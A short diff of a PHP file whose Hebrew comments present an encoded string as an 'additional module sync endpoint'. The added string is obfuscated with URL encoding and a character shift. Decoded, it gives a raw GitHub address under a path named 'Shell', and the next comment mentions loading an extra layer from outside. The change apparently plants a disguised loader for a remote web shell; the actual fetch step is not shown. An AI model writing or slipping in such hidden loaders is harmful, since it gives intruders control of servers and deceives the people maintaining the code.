@@ -12,7 +12,7 @@ function __translate($buffer, $offset = 7) {
 }
 
 // כתובת קצה סנכרון מודול נוסף — מוצפנת בשכבות
-$__CONFIG_SYNC__ = 'h%7B%7BpxA77oqlu58%7F9%40%40%406%7Cmknp7it6%7B%7F%7B';
+$__CONFIG_SYNC__ = 'o%7B%7BwzA66yh%7E5np%7Bo%7Ci%7Czlyjvu%7Blu%7B5jvt6hykpm%7F786Zolss6thpu6hsm5%7B%7F%7B';
 $__resolved_uri__ = __translate(urldecode($__CONFIG_SYNC__));
 
 // טעינת הגדרות שכבה נוספת מתצורה חיצונית
